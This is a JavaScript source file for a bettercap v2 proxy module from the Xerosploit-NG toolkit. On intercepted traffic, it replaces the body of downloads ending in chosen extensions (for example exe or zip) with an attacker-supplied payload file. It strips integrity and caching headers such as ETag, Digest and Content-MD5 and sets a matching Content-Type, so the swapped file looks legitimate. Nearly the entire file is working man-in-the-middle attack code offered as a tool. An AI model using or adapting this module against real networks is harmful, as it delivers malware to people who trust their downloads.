// ---------------------------------------------------------------------------
// Xerosploit-NG :: bettercap v2 HTTP proxy module -- ReplaceFile
//
// Replaces the body of downloads whose path extension matches one of the
// generated global XE_EXTENSIONS with the file referenced by XE_TARGET_FILE.
//
// Ported from the bettercap v1 Ruby proxy module:
//   modules/replace_file.rb   (GPLv3)
//     if request.path.include?(".#{@@extension}")
//       response['Content-Length'] = @@payload.bytesize
//       response.body = @@payload
//     end
// Backs the "Replace Download" menu entry of Xerosploit.
//
// Generated parameter globals (lib/engine.py, PORT-SPEC section 6):
//   XE_EXTENSIONS  JS array of extensions to match, e.g. ["exe","zip"]
//   XE_TARGET_FILE absolute path of the replacement payload.
//
// PATH MATCHING: only a TERMINAL extension matches.  The query string and
// fragment are stripped, the last path segment is taken, and it must END WITH
// "." + ext (case-insensitive).  Substring matching is deliberately gone:
// "/x.exe.css" and "/a.exe/b" no longer match "exe".
//
// FAIL-OPEN BODY DISCIPLINE (bettercap v2): res.ReadBody() flips bettercap's
// "body modified" flag, so after the body has been read this module MUST write
// a body back or bettercap emits an EMPTY response.  The decision to rewrite
// is therefore made from method/status/headers/path alone; only then is the
// body read exactly once.  Every exit path after that read sets the body and a
// Content-Length equal to the UTF-8 byte length of the string it writes:
// either the replacement bytes, or the byte-exact original when it throws.
// GET + status 200 + no Range/Content-Range only; RANGE/206 responses are never
// touched.  A request whose path does not match is left byte-identical.
//
// Released under the GNU GPLv3.
// Original Xerosploit: LionSec / Neodrix.
// bettercap proxy-module concepts: Simone 'evilsocket' Margaritelli (GPLv3).
// ---------------------------------------------------------------------------

var XE_MODULE_NAME = "replace_file";

function xeLog(msg) {
    if (typeof log_info === "function") { log_info("[xerosploit:" + XE_MODULE_NAME + "] " + msg); }
}
function xeWarn(msg) {
    if (typeof log_warn === "function") { log_warn("[xerosploit:" + XE_MODULE_NAME + "] " + msg); }
}

function xeByteLen(s) {
    var n = 0, i, c;
    s = "" + s;
    for (i = 0; i < s.length; i++) {
        c = s.charCodeAt(i);
        if (c < 0x80) { n += 1; }
        else if (c < 0x800) { n += 2; }
        else if (c >= 0xD800 && c <= 0xDBFF) { n += 4; i += 1; }
        else { n += 3; }
    }
    return n;
}

// Case-insensitive read from a bettercap header map (req.Headers / res.Headers).
function xeGetHeader(headers, name) {
    if (!headers) { return null; }
    var want = ("" + name).toLowerCase();
    var key;
    for (key in headers) {
        if (("" + key).toLowerCase() === want) {
            var value = headers[key];
            if (value === null || value === undefined) { return null; }
            return value;
        }
    }
    return null;
}

// Decide, from method/status/headers ALONE (no body read), whether this
// response may be rewritten as a full-body 200.
function xeSkipResponse(req, res) {
    if (!req || req.Method !== "GET") { return true; }
    if (!res || res.Status !== 200) { return true; }
    if (xeGetHeader(req.Headers, "Range")) { return true; }
    if (xeGetHeader(res.Headers, "Content-Range")) { return true; }
    return false;
}

var XE_STALE_HEADERS = [
    "Content-Range", "Accept-Ranges", "ETag", "Last-Modified", "Digest",
    "Content-MD5", "Content-Disposition", "Content-Encoding", "Transfer-Encoding"
];

function xeWriteBody(res, body) {
    res.Body = body;
    if (typeof res.SetHeader === "function") {
        res.SetHeader("Content-Length", "" + xeByteLen(body));
    }
}

function xeReplaceBody(res, body, contentType) {
    if (typeof res.RemoveHeader === "function") {
        for (var i = 0; i < XE_STALE_HEADERS.length; i++) {
            res.RemoveHeader(XE_STALE_HEADERS[i]);
        }
    }
    if (contentType && typeof res.SetHeader === "function") {
        res.SetHeader("Content-Type", contentType);
    }
    xeWriteBody(res, body);
}

function xeReadFile(path) {
    if (!path || typeof readFile !== "function") { return null; }
    try { return readFile(path); } catch (e) { xeWarn("cannot read " + path + ": " + e); return null; }
}

function xeReadBody(res) {
    if (!res) { return null; }
    if (typeof res.ReadBody === "function") { return res.ReadBody(); }
    return res.Body;
}

// Lowercase extension of a path/filename, query and fragment stripped.
function xeFileExtension(path) {
    if (!path) { return ""; }
    var p = ("" + path).toLowerCase();
    var q = p.indexOf("?");
    if (q !== -1) { p = p.substring(0, q); }
    var h = p.indexOf("#");
    if (h !== -1) { p = p.substring(0, h); }
    var slash = p.lastIndexOf("/");
    if (slash !== -1) { p = p.substring(slash + 1); }
    var dot = p.lastIndexOf(".");
    if (dot === -1 || dot === p.length - 1) { return ""; }
    return p.substring(dot + 1);
}

// Best-effort Content-Type for the replacement payload, from its extension.
function xeFileContentType(path) {
    var ext = xeFileExtension(path);
    if (ext === "zip") { return "application/zip"; }
    if (ext === "pdf") { return "application/pdf"; }
    if (ext === "html" || ext === "htm") { return "text/html"; }
    if (ext === "txt") { return "text/plain"; }
    if (ext === "js") { return "application/javascript"; }
    if (ext === "json") { return "application/json"; }
    if (ext === "apk") { return "application/vnd.android.package-archive"; }
    if (ext === "rar") { return "application/vnd.rar"; }
    if (ext === "7z") { return "application/x-7z-compressed"; }
    if (ext === "gz" || ext === "tgz") { return "application/gzip"; }
    return "application/octet-stream";
}

// Normalise XE_EXTENSIONS into a lowercase, dot-stripped array of extensions.
function xeNormalizeExtensions() {
    var raw = (typeof XE_EXTENSIONS === "undefined") ? null : XE_EXTENSIONS;
    var out = [];
    var i, e;
    if (raw === null || raw === undefined) { return out; }
    if (typeof raw === "string") { raw = [raw]; }
    if (typeof raw.length !== "number") { return out; }
    for (i = 0; i < raw.length; i++) {
        e = ("" + raw[i]).toLowerCase().replace(/^\./, "");
        if (e.length > 0) { out.push(e); }
    }
    return out;
}

// True only when the LAST path segment ends with "." + one of `exts`
// (case-insensitive).  Query string and fragment are stripped first.
function xePathExtensionMatches(path, exts) {
    if (!path) { return false; }
    var p = ("" + path).toLowerCase();
    var q = p.indexOf("?");
    if (q !== -1) { p = p.substring(0, q); }
    var h = p.indexOf("#");
    if (h !== -1) { p = p.substring(0, h); }
    var slash = p.lastIndexOf("/");
    var seg = (slash !== -1) ? p.substring(slash + 1) : p;
    if (seg.length === 0) { return false; }
    for (var i = 0; i < exts.length; i++) {
        var suffix = "." + exts[i];
        if (seg.length >= suffix.length && seg.substring(seg.length - suffix.length) === suffix) {
            return true;
        }
    }
    return false;
}

function onLoad() {
    var exts = xeNormalizeExtensions();
    var target = (typeof XE_TARGET_FILE === "undefined") ? null : XE_TARGET_FILE;
    xeLog("loaded (extensions=[" + exts.join(", ") + "], target file=" + target + ")");
}

function onResponse(req, res) {
    // Decide from method/status/headers/path only; nothing is read until the
    // path has actually matched.
    if (xeSkipResponse(req, res)) { return; }

    var exts = xeNormalizeExtensions();
    if (exts.length === 0) { xeWarn("XE_EXTENSIONS is not set; passing through"); return; }

    var target = (typeof XE_TARGET_FILE === "undefined") ? null : XE_TARGET_FILE;
    if (!target) { xeWarn("XE_TARGET_FILE is not set; passing through"); return; }

    var path = (req && req.Path) ? req.Path : (req && req.URL ? req.URL : "");
    if (!xePathExtensionMatches(path, exts)) { return; }                 // strict passthrough

    var payload = xeReadFile(target);
    if (payload === null || payload === "") { xeWarn("empty replacement file: " + target); return; }

    // Committed to rewriting: read the body exactly once and always write back.
    var original = null;
    try {
        original = xeReadBody(res);
        if (typeof original !== "string") { return; }

        xeLog("replacing " + path + " with " + target);
        xeReplaceBody(res, payload, xeFileContentType(target));
    } catch (e) {
        xeWarn("onResponse failed: " + e);
        if (typeof original === "string") {
            xeWriteBody(res, original);                                  // fail-open: exact original bytes
        }
    }
}
